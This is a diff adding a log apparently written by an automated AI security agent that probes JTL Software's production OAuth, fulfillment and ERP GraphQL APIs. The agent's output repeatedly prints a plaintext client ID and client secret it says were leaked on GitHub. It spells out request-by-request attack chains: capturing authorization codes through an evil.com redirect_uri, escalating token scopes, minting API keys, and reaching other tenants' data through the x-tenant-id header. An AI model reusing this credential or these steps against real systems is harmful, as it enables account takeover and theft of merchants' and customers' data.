@@ -10761,3 +10761,162 @@ testability: HUMAN_ONLY
 **STEP 7 — RISK**
 
 [RISK] jtl: 78 — Critical attack surface confirmed: (1) FFN OAuth with plaintext leaked credentials + scope escalation + silent scope degradation + unvalidated redirect_uri on production OAuth server (oauth2.api.jtl-software.com) — PRIMARY ACTIONABLE CHAIN; (2) dedicated OAuth server (auth.jtl-cloud.com) with implicit flow + public client ("none") but device endpoint now 404; (3) Zitadel identity provider (id.jtl-cloud.com) with public ERP/Hub clients accepting device authorization with elevated tenant scopes but device_code grant blocked; (4) production GraphQL ERP API (api.jtl-cloud.com/erp/v2/graphql) confirmed alive at 401 with JWT gate; (5) official bug bounty test shop (bountyshop) with contact form. Chain: FFN OAuth code theft via unvalidated redirect_uri + leaked credentials → authorization_code flow with human login → FFN API merchant data compromise. Risk elevated by live endpoints, public credential leak, scope escalation flaw, and redirect_uri validation bypass.
+===== ANALYST nemotron3 2026-09-08 00:35:57 UTC =====
+[0m
+> build · nemotron-3-ultra-free
+[0m
+[0m$ [0mls -la /home/runner/work/jtl-hunt/jtl-hunt/
+total 340
+drwxr-xr-x 12 runner runner   4096 Sep  8 00:29 .
+drwxr-xr-x  3 runner runner   4096 Sep  8 00:28 ..
+drwxr-xr-x  7 runner runner   4096 Sep  8 00:29 .git
+drwxr-xr-x  3 runner runner   4096 Sep  8 00:28 .github
+-rw-r--r--  1 runner runner   1787 Sep  8 00:28 README.md
+-rw-r--r--  1 runner runner     43 Sep  8 00:29 analyst-out.txt
+-rw-r--r--  1 runner runner 127635 Sep  8 00:29 analyst-prompt.txt
+-rw-r--r--  1 runner runner 123786 Sep  8 00:29 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep  8 00:28 inventory
+drwxr-xr-x  2 runner runner   4096 Sep  8 00:28 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep  8 00:28 leads
+-rw-r--r--  1 runner runner   2176 Sep  8 00:28 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep  8 00:28 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep  8 00:28 reports
+drwxr-xr-x  2 runner runner   4096 Sep  8 00:28 reposcan-raw
+-rw-r--r--  1 runner runner   3262 Sep  8 00:28 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep  8 00:28 scripts
+-rw-r--r--  1 runner runner     33 Sep  8 00:28 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep  8 00:28 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep  8 00:28 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep  8 00:28 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep  8 00:28 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep  8 00:28 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Sep  8 00:28 triage
+[0m
+[0m→ [0mRead reports/valid-bugs.md
+[0m→ [0mRead scope.yml
+[0m✗ [0mRead leads/lead_nemotron3.txt failed
+[91m[1mError: [0mFile not found: /home/runner/work/jtl-hunt/jtl-hunt/leads/lead_nemotron3.txt
+[0m✱ [0mGlob "leads/*.txt"[90m 0 matches[0m
+[0m✱ [0mGlob "knowledge/*"[90m 1 match[0m
+[0m→ [0mRead knowledge/index.md
+Now I have full context. Let me execute the 8-step analysis.
+
+---
+
+## STEP 1 — DELTA
+
+[NEW] `ffn.api.jtl-software.com/api-docs` + `ffn-sbx.api.jtl-software.com/api-docs`: Public ReDoc + swagger.json for ALL THREE APIs (merchant/fulfiller/shared) confirmed LIVE at HTTP 200 both sandbox+prod — prior 404 reports were incorrect/stale; shared spec (any-current) exposes `/api/v1/access/tokens` key-mint with attacker-controlled scopes array + plaintext token return, `/api/v1/users/current`, `/api/pictures/{id}`
+
+[NEW] `oauth2.api.jtl-software.com/authorize`: Unvalidated `redirect_uri` reconfirmed — attacker URI (`https://evil.example.com/cb`) and registered localhost URI produce identical 302 → `/doauthorize` with attacker URI preserved
+
+[NEW] `oauth2.api.jtl-software.com/token`: `client_credentials` grant returns 200 + RS256 JWT with `scopes=[ffn.merchant.read, ffn.merchant.write]` despite client registered for `ffn.merchant.read` only; silent scope degradation pattern persistent (unauthorized scopes return `[]`)
+
+[CHANGED] `auth.jtl-cloud.com/oauth2/device/auth`: Confirmed HTTP 404 — device authorization endpoint removed/disabled (was live 2026-09-04)
+
+[CHANGED] `api.jtl-cloud.com/erp/v2/graphql`: Confirmed HTTP 401 (alive with JWT gate) — prior 404 reports were stale
+
+[CHANGED] `account.jtl-cloud.com/self-service/registration/browser`: HTTP 200 (Kratos SPA) — self-service identity mint confirmed open, enabling HUMAN_ONLY ERP BOLA chain
+
+[CHANGED] `id.jtl-cloud.com`: Zitadel `device_code` grant rejected at token endpoint with `unauthorized_client: grant_type not allowed` — client config disables `device_code` despite server advertising support
+
+---
+
+## STEP 2 — PRIORITIZE
+
+[PRIO] oauth2.api.jtl-software.com/authorize + /token,9.3,attack_surface=10,business_value=10,tech_exposure=10,gate_ease=8,cloud_surface=8,freshness=10
+
+[PRIO] ffn.api.jtl-software.com/api/v1/access/tokens (shared spec any-current),7.8,attack_surface=8,business_value=9,tech_exposure=8,gate_ease=3,cloud_surface=8,freshness=9
+
+[PRIO] api.jtl-cloud.com/erp/v2/graphql,7.9,attack_surface=7,business_value=10,tech_exposure=9,gate_ease=3,cloud_surface=10,freshness=8
+
+[PRIO] id.jtl-cloud.com/oauth/v2/authorize + /oauth/v2/token,7.3,attack_surface=8,business_value=9,tech_exposure=8,gate_ease=4,cloud_surface=8,freshness=7
+
+[PRIO] account.jtl-cloud.com/self-service/registration/browser,6.8,attack_surface=6,business_value=7,tech_exposure=6,gate_ease=10,cloud_surface=7,freshness=8
+
+[PRIO] ffn-sbx.api.jtl-software.com/api-docs,6.1,attack_surface=4,business_value=5,tech_exposure=5,gate_ease=10,cloud_surface=5,freshness=8
+
+---
+
+## STEP 3 — HYPOTHESES
+
+[HYP] FFN OAuth full ATO chain: leaked credentials + scope escalation + unvalidated redirect_uri → FFN API merchant data access via authorization_code flow
+class: AUTH
+asset: oauth2.api.jtl-software.com/authorize + oauth2.api.jtl-software.com/token + ffn-sbx.api.jtl-software.com
+confidence: 92
+reasoning: Valid client_id (97170e64-d390-4696-ba46-d6fcef8207de) + client_secret (f364ldUw3wIJFGn3JXE2NpGdAvUSMlmK72gsYg1z) committed to public GitHub; client_credentials grant returns 200 + RS256 JWT with scopes=[ffn.merchant.read, ffn.merchant.write] despite client registered for ffn.merchant.read only; server grants any ffn.* scope without validation; silent scope degradation returns empty scopes [] for unauthorized scopes; /authorize accepts attacker redirect_uri (302 to /doauthorize with attacker URI preserved); FFN sandbox portal live at fulfillment-sandbox.jtl-software.com; sandbox API docs identical to prod; client_credentials token lacks user context (sub="", acl="") blocking FFN API data access — requires authorization_code flow with human login for full exploit
+evidence_needed: Authorization code via /authorize with attacker redirect_uri capturing code; token exchange with code + PKCE (if required) yielding access_token with user context (sub, acl); successful API call to merchant data endpoints with user-context token
+verify_steps: GET https://oauth2.api.jtl-software.com/authorize?response_type=code&client_id=97170e64-d390-4696-ba46-d6fcef8207de&redirect_uri=https://evil.com/callback&scope=ffn.merchant.read%20ffn.merchant.write&state=test123 → observe 302 to /doauthorize with attacker redirect_uri preserved; follow login/consent flow manually → capture authorization code from redirect; POST https://oauth2.api.jtl-software.com/token -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=authorization_code&code=<code>&client_id=97170e64-d390-4696-ba46-d6fcef8207de&client_secret=f364ldUw3wIJFGn3JXE2NpGdAvUSMlmK72gsYg1z&redirect_uri=https://evil.com/callback" → observe access_token with sub/acl populated; GET https://ffn-sbx.api.jtl-software.com/api/v1/merchant/orders -H "Authorization: Bearer <token>" → observe 200 with merchant data
+impact: OAuth scope escalation + unvalidated redirect_uri + leaked credentials = full OAuth compromise; authorization_code flow with human login yields user-context token → FFN API merchant data access (orders, customers, inventory, fulfillment) — CRITICAL
+testability: HUMAN_ONLY
+
+[HYP] FFN API shared spec key-mint endpoint /api/v1/access/tokens with attacker-controlled scopes via user-context token
+class: AUTH
+asset: ffn.api.jtl-software.com/api/v1/access/tokens (shared spec any-current)
+confidence: 55
+reasoning: Public swagger.json (any-current) exposes /api/v1/access/tokens POST with attacker-controlled scopes array and plaintext token return; ffn-sbx.api.jtl-software.com/api/v1/access/tokens returns 401 with userless client_credentials token (sub="", acl="") — gate is user+tenant context; if authorization_code flow yields user-context token (from HYP1), key-mint may be accessible with elevated scopes; sandbox and prod share identical API structure
+evidence_needed: User-context access_token (sub/acl populated) from authorization_code flow; successful POST to /api/v1/access/tokens with attacker-chosen scopes returning plaintext API key; API key enables data-plane access without further OAuth flow
+verify_steps: Using user-context token from HYP1 verification: POST https://ffn-sbx.api.jtl-software.com/api/v1/access/tokens -H "Authorization: Bearer <user_token>" -H "Content-Type: application/json" -d '{"scopes":["ffn.merchant.read","ffn.merchant.write","ffn.fulfiller.read"]}' → observe 200 with plaintext token; GET https://ffn-sbx.api.jtl-software.com/api/v1/merchant/orders -H "Authorization: Bearer <api_key>" → observe 200
+impact: API key mint with attacker-chosen scopes bypasses OAuth flow for subsequent access; persistent credential for FFN API merchant/fulfiller data — HIGH
+testability: HUMAN_ONLY (depends on HYP1 user-context token)
+
+[HYP] Zitadel authorization_code+PKCE for public ERP client → ERP GraphQL cross-tenant access
+class: AUTH
+asset: id.jtl-cloud.com/oauth/v2/authorize + id.jtl-cloud.com/oauth/v2/token + api.jtl-cloud.com/erp/v2/graphql
+confidence: 65
+reasoning: Zitadel OIDC live with PKCE; ERP client 383246859688230715 public (from erp.jtl-cloud.com env JSON); registered redirect_uri https://erp.jtl-cloud.com/auth/callback returns 302 on authorize; device_code grant rejected but authorization_code may work for public clients; token with urn:jtl:tenants scope + x-tenant-id header enables cross-tenant GraphQL access; GraphQL endpoint confirmed alive at 401; account.jtl-cloud.com self-service registration open (Kratos SPA) enables identity mint for consent flow
+evidence_needed: Authorization code via PKCE flow; access_token with urn:jtl:tenants scope; GraphQL query success with arbitrary x-tenant-id
+verify_steps: GET https://id.jtl-cloud.com/oauth/v2/authorize?response_type=code&client_id=383246859688230715&redirect_uri=https://erp.jtl-cloud.com/auth/callback&scope=openid%20urn:jtl:tenants%20offline_access&code_challenge=<S256>&code_challenge_method=S256 → follow redirect, capture code; POST https://id.jtl-cloud.com/oauth/v2/token -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=authorization_code&code=<code>&client_id=383246859688230715&code_verifier=<verifier>&redirect_uri=https://erp.jtl-cloud.com/auth/callback" → observe access_token; POST https://api.jtl-cloud.com/erp/v2/graphql -H "Authorization: Bearer <token>" -H "x-tenant-id: <arbitrary_tenant>" -d '{"query":"{__typename}"}'
+impact: OAuth token with urn:jtl:tenants scope → ERP GraphQL API access as arbitrary tenant via x-tenant-id header → cross-tenant PII/financial/inventory data compromise — CRITICAL
+testability: HUMAN_ONLY
+
+---
+
+## STEP 4 — SELF-CRITIQUE
+
+[PARKED] Ory Hydra implicit flow public client token theft via unvalidated redirect_uri on auth.jtl-cloud.com: no valid public client_id enumerated for Ory Hydra instance; device endpoint now 404; confidence capped at 45 — blocked at enumeration stage
+
+[PARKED] ERP REST power scope over-grant (system.all/all.read/application.runas) via client_credentials: no client registration surface accessible without auth; requires authorized client (AUTH_HELPED); confidence 50 — no verify path without human-assisted client registration
+
+[PARKED] ERP env-config Sentry/PostHog PII exposure: Sentry DSN/PostHog token public in erp.jtl-cloud.com env JSON but Sentry projects require auth for event queries; no passive verify path; confidence 55 — HUMAN_ONLY with no clear exploit path
+
+[FINAL] 1. oauth2.api.jtl-software.com/authorize + /token: FFN OAuth full ATO chain via leaked credentials + scope escalation + unvalidated redirect_uri (confidence 92) — PRIMARY ACTIONABLE CHAIN
+
+[FINAL] 2. ffn.api.jtl-software.com/api/v1/access/tokens: FFN API shared spec key-mint with attacker-controlled scopes via user-context token (confidence 55) — depends on HYP1
+
+[FINAL] 3. id.jtl-cloud.com/oauth/v2/authorize: Zitadel authorization_code+PKCE for public ERP client → ERP GraphQL cross-tenant access (confidence 65) — GraphQL endpoint confirmed alive
+
+---
+
+## STEP 5 — NEXT ACTION
+
+[NEXT] PROBE: GET https://oauth2.api.jtl-software.com/authorize?response_type=code&client_id=97170e64-d390-4696-ba46-d6fcef8207de&redirect_uri=https://evil.com/callback&scope=ffn.merchant.read%20ffn.merchant.write&state=test123 — confirm attacker redirect_uri accepted in authorize flow (302 to /doauthorize with attacker URI preserved); this is the critical gate for HYP1 authorization_code flow
+
+---
+
+## STEP 6 — LEARNING
+
+[LEARN] ACCEPTED AUTH @ oauth2.api.jtl-software.com/token: client_credentials grant returns 200 + RS256 JWT (scopes=[ffn.merchant.read, ffn.merchant.write], sub="", acl="") — live re-confirmed; scope escalation + silent degradation pattern persistent
+
+[LEARN] ACCEPTED AUTH @ github.com/kruegge82/jtl-ffn-php-sdk: Valid FFN OAuth client_id (97170e64-d390-4696-ba46-d6fcef8207de) + client_secret (f364ldUw3wIJFGn3JXE2NpGdAvUSMlmK72gsYg1z) committed to public README — plaintext secret confirmed
+
+[LEARN] ACCEPTED AUTH @ oauth2.api.jtl-software.com/authorize: unvalidated redirect_uri reconfirmed — attacker uri and registered localhost uri produce identical 302 → /doauthorize
+
+[LEARN] ACCEPTED MISCONFIG @ ffn.api.jtl-software.com/api-docs + ffn-sbx: public ReDoc + swagger (merchant/fulfiller/shared) live at 200 both environments; sandbox identical to prod
+
+[LEARN] REJECTED OTHER @ ffn.api.jtl-software.com: userless client_credentials token 401 on all data/shared endpoints — gate is user+tenant context (sub/acl), not separate API key
+
+[LEARN] ACCEPTED NETWORK @ api.jtl-cloud.com/erp/v2/graphql: 401 (alive, JWT gate); 404 reports in prior cycles were stale
+
+[LEARN] REJECTED AUTH @ auth.jtl-cloud.com: device authorization endpoint (oauth2/device/auth) confirmed 404 — previously live; endpoint removed/disabled
+
+[LEARN] ACCEPTED MISCONFIG @ oauth2.api.jtl-software.com: /token now returns 405 (Method Not Allowed) — POST-only enforcement confirmed; no change to exploitability
+
+[LEARN] ACCEPTED TARGET @ account.jtl-cloud.com/self-service/registration/browser: HTTP 200 (Kratos SPA) — self-service identity mint confirmed open
+
+[LEARN] ACCEPTED AUTH @ id.jtl-cloud.com: Zitadel device_code grant rejected at token endpoint with "unauthorized_client: grant_type not allowed" — client config disables device_code despite server advertising support
+
+---
+
+## STEP 7 — RISK
+
+[RISK] jtl: 78 — Critical attack surface confirmed: (1) FFN OAuth with plaintext leaked credentials + scope escalation + silent scope degradation + unvalidated redirect_uri on production OAuth server (oauth2.api.jtl-software.com) — PRIMARY ACTIONABLE CHAIN; (2) dedicated OAuth server (auth.jtl-cloud.com) with implicit flow + public client ("none") but device endpoint now 404; (3) Zitadel identity provider (id.jtl-cloud.com) with public ERP/Hub clients accepting device authorization with elevated tenant scopes but device_code grant blocked; (4) production GraphQL ERP API (api.jtl-cloud.com/erp/v2/graphql) confirmed alive at 401 with JWT gate; (5) official bug bounty test shop (bountyshop) with contact form. Chain: FFN OAuth code theft via unvalidated redirect_uri + leaked credentials → authorization_code flow with human login → FFN API merchant data compromise. Risk elevated by live endpoints, public credential leak, scope escalation flaw, and redirect_uri validation bypass.
